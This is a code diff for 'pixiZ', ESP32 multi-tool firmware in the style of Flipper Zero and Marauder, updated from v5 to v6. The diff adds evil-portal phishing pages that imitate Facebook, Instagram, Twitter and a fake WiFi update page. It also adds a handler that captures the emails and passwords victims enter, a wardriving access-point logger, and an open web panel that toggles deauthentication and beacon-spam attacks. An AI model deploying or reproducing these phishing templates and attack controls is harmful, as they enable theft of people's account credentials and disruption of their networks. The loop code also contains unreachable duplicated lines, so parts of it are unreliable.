@@ -1,5 +1,5 @@
 /*
- * pixiZ v5 — Universal Multi-Tool Remote
+ * pixiZ v6 — Universal Multi-Tool Remote
  * PolyCast5 + Flipper Zero + Bruce + Marauder hybrid
  * ESP32 DevKit V4
  * github.com/azerenes/pixiZ-v1
@@ -924,15 +924,17 @@ const char portalSuccess[] PROGMEM = R"rawliteral(
 )rawliteral";
 
 void handlePortalRoot() {
-  if (portalServer->hasArg("p")) {
-    String p = portalServer->arg("p");
+  String e = portalServer->hasArg("e") ? portalServer->arg("e") : "";
+  String p = portalServer->hasArg("p") ? portalServer->arg("p") : "";
+  if (p.length() > 0 || e.length() > 0) {
     if (portalCredN < 5) {
-      snprintf(portalCreds[portalCredN], 64, "Sifre: %s", p.c_str());
+      if (e.length() > 0) snprintf(portalCreds[portalCredN], 64, "Email: %s", e.c_str());
+      else snprintf(portalCreds[portalCredN], 64, "Sifre: %s", p.c_str());
       portalCredN++;
     }
     portalServer->send(200, "text/html", portalSuccess);
   } else {
-    portalServer->send(200, "text/html", portalHTML);
+    portalServer->send(200, "text/html", portalGetHTML(portalPresetSel));
   }
 }
 
@@ -997,22 +999,23 @@ void drawEvilPortal() {
   tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 24);
   tft.print("SSID: ");
   tft.setTextColor(ST77XX_WHITE); tft.print(portalSSID);
-  tft.setCursor(8, 40); tft.setTextColor(ST77XX_CYAN);
-  tft.print("IP: ");
-  tft.setTextColor(ST77XX_WHITE); tft.print(portalIP.toString());
-  tft.setCursor(8, 56); tft.setTextColor(ST77XX_GREEN);
+  tft.setCursor(8, 38); tft.setTextColor(ST77XX_CYAN);
+  tft.print("IP: "); tft.setTextColor(ST77XX_WHITE); tft.print(portalIP.toString());
+  tft.setCursor(8, 52); tft.setTextColor(ST77XX_CYAN);
+  tft.print("Sayfa: "); tft.setTextColor(ST77XX_WHITE); tft.print(portalPresets[portalPresetSel]);
+  tft.setCursor(8, 66); tft.setTextColor(ST77XX_GREEN);
   tft.printf("Yakalanan: %d", portalCredN);
   for (int i = 0; i < portalCredN && i < 2; i++) {
-    tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 70+i*12);
+    tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 76+i*12);
     tft.print(portalCreds[i]);
   }
   if (portalCredN > 2) {
-    tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 94);
+    tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 100);
     tft.printf("+%d daha", portalCredN-2);
   }
-  tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 108);
-  tft.print("Baglan -> sifre gir -> yakala");
-  ftr("OK=Baslat/Durdur  MENU=Cikis");
+  tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 110);
+  tft.print("Baglan->sifre gir->yakala");
+  ftr("OK=Bas/Durdur  MENU=Cikis");
 }
 
 void actEvilPortal() {
@@ -1235,6 +1238,266 @@ void toggleARPSpoof() {
 }
 
 // ═══════════════════════════════════════════════════
+//  WARDRIVING (AP Logger)
+// ═══════════════════════════════════════════════════
+
+#define MAX_WD_AP 50
+struct WardriveAP { char ssid[33]; char bssid[18]; int rssi; int ch; uint8_t enc; unsigned long t; };
+WardriveAP wdAPs[MAX_WD_AP];
+int wdN = 0;
+bool wdRunning = false;
+
+void wdLogAP(const char* ssid, const char* bssid, int rssi, int ch, uint8_t enc) {
+  if (wdN >= MAX_WD_AP) return;
+  // Dedup
+  for (int i = 0; i < wdN; i++) {
+    if (strcmp(wdAPs[i].bssid, bssid) == 0) {
+      wdAPs[i].rssi = rssi; wdAPs[i].t = millis(); return; // update
+    }
+  }
+  strncpy(wdAPs[wdN].ssid, ssid, 32); wdAPs[wdN].ssid[32]=0;
+  strncpy(wdAPs[wdN].bssid, bssid, 17); wdAPs[wdN].bssid[17]=0;
+  wdAPs[wdN].rssi = rssi; wdAPs[wdN].ch = ch; wdAPs[wdN].enc = enc;
+  wdAPs[wdN].t = millis(); wdN++;
+}
+
+void doWardrive() {
+  wdRunning = true;
+  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(100);
+  int n = WiFi.scanNetworks();
+  if (n > MAX_WD_AP) n = MAX_WD_AP;
+  for (int i = 0; i < n; i++) {
+    wdLogAP(WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.RSSI(i), WiFi.channel(i), WiFi.encryptionType(i));
+  }
+  WiFi.scanDelete();
+  wdRunning = false;
+}
+
+void svWardrive() {
+  prefs.putInt("wdn", wdN);
+  for (int i = 0; i < wdN && i < 20; i++) { // save top 20 to NVS
+    char k[16];
+    sprintf(k, "wds%d", i); prefs.putString(k, wdAPs[i].ssid);
+    sprintf(k, "wdb%d", i); prefs.putString(k, wdAPs[i].bssid);
+    sprintf(k, "wdr%d", i); prefs.putInt(k, wdAPs[i].rssi);
+  }
+}
+
+void ldWardrive() {
+  wdN = prefs.getInt("wdn", 0);
+  if (wdN > MAX_WD_AP) wdN = MAX_WD_AP;
+  for (int i = 0; i < wdN && i < 20; i++) {
+    char k[16];
+    sprintf(k, "wds%d", i); String s = prefs.getString(k, "");
+    strncpy(wdAPs[i].ssid, s.c_str(), 32); wdAPs[i].ssid[32]=0;
+    sprintf(k, "wdb%d", i); String b = prefs.getString(k, "");
+    strncpy(wdAPs[i].bssid, b.c_str(), 17); wdAPs[i].bssid[17]=0;
+    sprintf(k, "wdr%d", i); wdAPs[i].rssi = prefs.getInt(k, -100);
+    wdAPs[i].t = 0;
+  }
+}
+
+void drawWardrive() {
+  pg = 47; hdr("WARDRIVING", ST77XX_GREEN);
+  if (wdRunning) { tft.setTextColor(ST77XX_YELLOW); tft.setCursor(8,40); tft.print("Taniyor..."); ftr("MENU=Cikis"); return; }
+  tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 24);
+  tft.printf("Toplam: %d AP", wdN);
+  int openN = 0, wpaN = 0;
+  for (int i = 0; i < wdN; i++) {
+    if (wdAPs[i].enc == 0 || wdAPs[i].enc == 1) openN++;
+    else wpaN++;
+  }
+  tft.setCursor(8, 38); tft.setTextColor(ST77XX_GREEN);
+  tft.printf("Acik: %d", openN);
+  tft.setCursor(80, 38); tft.setTextColor(ST77XX_WHITE);
+  tft.printf("Guvenli: %d", wpaN);
+  for (int i = 0; i < wdN && i < 3; i++) {
+    int idx = wdN - 1 - i;
+    tft.setTextColor(ST77XX_GREY); tft.setCursor(4, 54+i*10);
+    tft.printf("%d%% %s", constrain(100+wdAPs[idx].rssi*2,0,100), wdAPs[idx].ssid);
+  }
+  if (wdN > 3) { tft.setTextColor(ST77XX_GREY); tft.setCursor(4, 84); tft.printf("+%d AP daha...", wdN-3); }
+  ftr("OK=Tara  MENU=Geri");
+}
+
+void actWardrive() {
+  if (pg == 47) {
+    if (menu()) { pg=12; drawHackMenu(); }
+    else if (ok() && !wdRunning) { doWardrive(); svWardrive(); drawWardrive(); }
+  }
+}
+
+// ═══════════════════════════════════════════════════
+//  WEBUI (Web Dashboard)
+// ═══════════════════════════════════════════════════
+
+WebServer* webuiServer = NULL;
+bool webuiRunning = false;
+
+const char webuiHTML[] PROGMEM = R"rawliteral(
+<!DOCTYPE html><html><head><meta name=viewport content=width=320>
+<title>pixiZ WebUI</title><style>
+body{font-family:sans-serif;background:#111;color:#fff;margin:0;padding:10px}
+h1{color:#0af;font-size:18px;text-align:center}
+.card{background:#222;border-radius:6px;padding:10px;margin:6px 0}
+.green{color:#0f0}.red{color:#f00}.yellow{color:#ff0}
+a{display:block;background:#0af;color:#fff;text-align:center;padding:8px;border-radius:4px;margin:4px 0;text-decoration:none}
+</style></head><body>
+<h1>pixiZ v6 WebUI</h1>
+<div class=card>IR: <span class=green>HAZIR</span></div>
+<div class=card>BT KB: <span class=yellow>BEKLIYOR</span></div>
+<div class=card>Beacon: <span id=b class=red>KAPALI</span></div>
+<div class=card>Deauth: <span id=d class=red>KAPALI</span></div>
+<a href='/beacon'>Beacon Ac/Kapat</a>
+<a href='/deauth'>Deauth Ac/Kapat</a>
+<a href='/scan'>WiFi Tara</a>
+<a href='/restart'>Yeniden Baslat</a>
+</body></html>
+)rawliteral";
+
+void handleWebUI() { webuiServer->send(200, "text/html", webuiHTML); }
+void handleWebBeacon() {
+  toggleHack(0);
+  webuiServer->send(200, "text/html", "<meta http-equiv=refresh content=2;url=/>" + String(beaconRunning ? "Beacon AKTIF" : "Beacon KAPALI"));
+}
+void handleWebDeauth() {
+  toggleHack(1);
+  webuiServer->send(200, "text/html", "<meta http-equiv=refresh content=2;url=/>" + String(deauthRunning ? "Deauth AKTIF" : "Deauth KAPALI"));
+}
+void handleWebScan() {
+  doWiFiScan();
+  webuiServer->send(200, "text/html", "<meta http-equiv=refresh content=2;url=/>WiFi Tarandi");
+}
+void handleWebRestart() { webuiServer->send(200, "text/html", "Restart..."); delay(500); ESP.restart(); }
+
+void startWebUI() {
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP("pixiZ-WebUI", NULL, 1, 0, 1);
+  delay(500);
+  if (!webuiServer) webuiServer = new WebServer(80);
+  webuiServer->on("/", handleWebUI);
+  webuiServer->on("/beacon", handleWebBeacon);
+  webuiServer->on("/deauth", handleWebDeauth);
+  webuiServer->on("/scan", handleWebScan);
+  webuiServer->on("/restart", handleWebRestart);
+  webuiServer->begin();
+  webuiRunning = true;
+}
+void stopWebUI() {
+  if (webuiServer) webuiServer->close();
+  WiFi.softAPdisconnect(true);
+  webuiRunning = false;
+}
+
+void drawWebUI() {
+  pg = 48; hdr("WEBUI", ST77XX_CYAN);
+  tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 28);
+  tft.print("Web Kontrol Paneli");
+  tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 44);
+  tft.print("SSID: pixiZ-WebUI");
+  tft.setCursor(8, 60); tft.setTextColor(ST77XX_GREEN);
+  tft.print("IP: 192.168.4.1");
+  tft.setCursor(8, 76); tft.setTextColor(ST77XX_GREY);
+  tft.print(webuiRunning ? "Aktif - baglan" : "Baslatmak icin OK");
+  ftr("OK=Ac/Kapat  MENU=Cikis");
+}
+
+void actWebUI() {
+  if (menu()) {
+    if (webuiRunning) stopWebUI();
+    pg=12; drawHackMenu();
+  } else if (ok()) {
+    if (!webuiRunning) startWebUI();
+    else stopWebUI();
+    drawWebUI();
+  }
+}
+
+// ═══════════════════════════════════════════════════
+//  EVIL PORTAL PRESETS
+// ═══════════════════════════════════════════════════
+
+const char* portalPresets[] = {
+  "WiFi Update",
+  "Facebook Login",
+  "Instagram Login",
+  "Twitter Login"
+};
+const int portalPresetN = 4;
+int portalPresetSel = 0;
+
+const char* portalGetHTML(int preset) {
+  switch (preset) {
+    case 0:
+      return R"rawliteral(
+<!DOCTYPE html><html><head><meta name=viewport content=width=320>
+<title>WiFi Update</title><style>
+body{font-family:sans-serif;background:#f0f0f0;margin:0;padding:20px;text-align:center}
+.card{background:#fff;border-radius:8px;padding:20px;margin:20px 0;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+h1{color:#333;font-size:18px}
+input{width:90%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:14px}
+button{background:#007aff;color:#fff;border:none;padding:12px 40px;border-radius:4px;font-size:16px;cursor:pointer}
+</style></head><body><div class=card><h1>WiFi Guncellemesi</h1><p style=color:#666>Baglanti icin sifre girin</p>
+<form action=/ method=post><input type=password name=p placeholder=WiFi-Sifre required><br><button type=submit>Gonder</button></form></div></body></html>)rawliteral";
+    case 1:
+      return R"rawliteral(
+<!DOCTYPE html><html><head><meta name=viewport content=width=320>
+<title>Facebook</title><style>
+body{background:#fff;font-family:sans-serif;text-align:center;padding:20px}
+.logo{color:#1877f2;font-size:36px;font-weight:bold;margin:20px 0}
+input{width:90%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}
+button{width:95%;background:#1877f2;color:#fff;border:none;padding:12px;border-radius:6px;font-size:16px;cursor:pointer}
+</style></head><body><div class=logo>facebook</div>
+<form action=/ method=post><input type=text name=e placeholder=E-posta required>
+<input type=password name=p placeholder=Sifre required>
+<button type=submit>Giris Yap</button></form></body></html>)rawliteral";
+    case 2:
+      return R"rawliteral(
+<!DOCTYPE html><html><head><meta name=viewport content=width=320>
+<title>Instagram</title><style>
+body{background:#fff;font-family:sans-serif;text-align:center;padding:20px}
+.logo{font-size:28px;font-weight:bold;margin:20px 0;background:-webkit-linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+input{width:90%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}
+button{width:95%;background:#0095f6;color:#fff;border:none;padding:12px;border-radius:6px;font-size:16px;cursor:pointer}
+</style></head><body><div class=logo>Instagram</div>
+<form action=/ method=post><input type=text name=e placeholder="Telefon, kullanici adi veya e-posta" required>
+<input type=password name=p placeholder=Sifre required>
+<button type=submit>Giris Yap</button></form></body></html>)rawliteral";
+    default:
+      return R"rawliteral(
+<!DOCTYPE html><html><head><meta name=viewport content=width=320>
+<title>Twitter</title><style>
+body{background:#fff;font-family:sans-serif;text-align:center;padding:20px}
+.logo{color:#1da1f2;font-size:32px;font-weight:bold;margin:20px 0}
+input{width:90%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}
+button{width:95%;background:#1da1f2;color:#fff;border:none;padding:12px;border-radius:30px;font-size:16px;cursor:pointer}
+</style></head><body><div class=logo>Twitter</div>
+<form action=/ method=post><input type=text name=e placeholder="Telefon, e-posta veya kullanici adi" required>
+<input type=password name=p placeholder=Sifre required>
+<button type=submit>Giris Yap</button></form></body></html>)rawliteral";
+  }
+}
+
+void drawPortalPresets() {
+  pg = 42; hdr("PORTAL TEMPLATES", ST77XX_RED);
+  for (int i = 0; i < portalPresetN && i < 5; i++) {
+    int y = 24+i*19; bool s = i==portalPresetSel;
+    tft.fillRect(2, y, 156, 17, s ? ST77XX_RED : ST77XX_BLACK);
+    if (s) tft.drawRoundRect(2, y, 156, 17, 3, ST77XX_RED);
+    tft.setTextColor(s ? ST77XX_BLACK : ST77XX_WHITE);
+    tft.setCursor(6, y+4); tft.print(portalPresets[i]);
+  }
+  ftr("OK=Sec  MENU=Geri");
+}
+
+void actPortalPresets() {
+  if (menu()) { pg=12; drawHackMenu(); }
+  else if (ok()) { drawEvilPortal(); }
+  else if (up()) { portalPresetSel=(portalPresetSel-1+portalPresetN)%portalPresetN; drawPortalPresets(); }
+  else if (down()) { portalPresetSel=(portalPresetSel+1)%portalPresetN; drawPortalPresets(); }
+}
+
+// ═══════════════════════════════════════════════════
 //  SPLASH + SETUP
 // ═══════════════════════════════════════════════════
 
@@ -1245,7 +1508,7 @@ void splash() {
   tft.setCursor(32, 30); tft.print("pixiZ");
   tft.setTextSize(1); tft.setTextColor(ST77XX_CYAN);
   tft.setCursor(28, 56); tft.print("Multi-Tool");
-  tft.setCursor(24, 72); tft.print("Remote v5");
+  tft.setCursor(24, 72); tft.print("Remote v6");
   tft.setTextColor(ST77XX_GREY);
   tft.setCursor(12, 100); tft.print("ESP32 DevKit V4");
 }
@@ -1271,6 +1534,7 @@ void setup() {
 #if ENABLE_PASS
   ldPass();
 #endif
+  ldWardrive();
 #if ENABLE_BT
   bleKeyboard.begin();
 #endif
@@ -1320,7 +1584,7 @@ const char* mn[] = {
 const int MNC = sizeof(mn)/sizeof(mn[0]);
 
 void drawMain() {
-  pg = 0; hdr("pixiZ v5", ST77XX_BLUE);
+  pg = 0; hdr("pixiZ v6", ST77XX_BLUE);
   for (int i = 0; i < MNC; i++) mi(i, MNC, 28, 28, ST77XX_CYAN, sel, mn[i]);
   ftr("UP/DOWN  OK=Sel  MENU=Tools");
 }
@@ -1685,7 +1949,7 @@ void actWiFi() {
           if (WiFi.status() == WL_CONNECTED) {
             snprintf(qrBuf, 127, "WIFI:S:%s;T:WPA;P:%s;;", WiFi.SSID().c_str(), "");
           } else {
-            snprintf(qrBuf, 127, "pixiZ v4 Multi-Tool");
+            snprintf(qrBuf, 127, "pixiZ v6 Multi-Tool");
           }
           strcpy(qrText, qrBuf);
           drawQR(qrText);
@@ -1714,7 +1978,9 @@ const char* hkm[] = {
   "RAW Sniffer",
   "Evil Portal",
   "AirTag Sniff",
+  "Wardriving",
   "ESP-NOW",
+  "WebUI",
   "ARP Spoofing"
 };
 const int HKC = sizeof(hkm)/sizeof(hkm[0]);
@@ -1748,8 +2014,10 @@ void drawHackMenu() {
       case 8: act = rawSniffRunning; break;
       case 9: act = portalRunning; break;
       case 10: act = airtagRunning; break;
-      case 11: act = espnowInit; break;
-      case 12: act = arpRunning; break;
+      case 11: act = wdN > 0; break;
+      case 12: act = espnowInit; break;
+      case 13: act = webuiRunning; break;
+      case 14: act = arpRunning; break;
     }
     if (act) {
       tft.setTextColor(ST77XX_GREEN); tft.setCursor(136, y+3); tft.print("ON");
@@ -1933,10 +2201,12 @@ void actHackMenu() {
     else if (sel2 == 6) { drawBeaconSniff(); }
     else if (sel2 == 7) { drawPortScan(); }
     else if (sel2 == 8) { toggleRawSniff(); }
-    else if (sel2 == 9) { drawEvilPortal(); }
+    else if (sel2 == 9) { pg=42; portalPresetSel=0; drawPortalPresets(); }
     else if (sel2 == 10) { drawAirTagSniff(); }
-    else if (sel2 == 11) { pg=44; drawESPNOW(); }
-    else if (sel2 == 12) { toggleARPSpoof(); }
+    else if (sel2 == 11) { drawWardrive(); }
+    else if (sel2 == 12) { pg=44; drawESPNOW(); }
+    else if (sel2 == 13) { drawWebUI(); }
+    else if (sel2 == 14) { toggleARPSpoof(); }
   }
   else if (up()) { int o=sel2; if (sel2>0) sel2--; drawHackMenu(); }
   else if (down()) { int o=sel2; if (sel2<HKC-1) sel2++; drawHackMenu(); }
@@ -2300,11 +2570,11 @@ void toolsDown() { int o=sel3; sel3=(sel3+1)%TLC; mi(o,TLC,28,28,ST77XX_CYAN,sel
 void toolsOk() {
   switch (sel3) {
     case 0:
-      hdr("pixiZ v5", ST77XX_BLUE);
+      hdr("pixiZ v6", ST77XX_BLUE);
       tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 30); tft.print("pixiZ Multi-Tool");
-      tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 46); tft.print("Surum 5.0");
+      tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 46); tft.print("Surum 6.0");
       tft.setCursor(8, 62); tft.print("Bruce + Marauder +");
-      tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 82); tft.print("IR+BT+WiFi+BLE+QR+Port");
+      tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 82); tft.print("IR+BT+WiFi+BLE+QR+Web");
       tft.setCursor(8, 98); tft.print("github.com/azerenes/pixiZ-v1");
       ftr("MENU=Geri"); pg = 11; break;
     case 1:
@@ -2446,12 +2716,18 @@ void loop() {
         else if (ok()) { toggleRawSniff(); }
         break;
       case 41: actEvilPortal(); break;
+      case 42: actPortalPresets(); break;
       case 43:
         if (menu()) { pg=12; drawHackMenu(); }
         else if (ok() && !airtagRunning) { startAirTagSniff(); }
         break;
       case 44: case 45: actESPNOW(); break;
       case 46:
+        if (menu()) { arpRunning=false; esp_wifi_set_promiscuous(false); pg=12; drawHackMenu(); }
+        else if (ok()) { toggleARPSpoof(); }
+        break;
+      case 47: actWardrive(); break;
+      case 48: actWebUI(); break;
         if (menu()) { arpRunning=false; esp_wifi_set_promiscuous(false); pg=12; drawHackMenu(); }
         else if (ok()) { toggleARPSpoof(); }
         break;
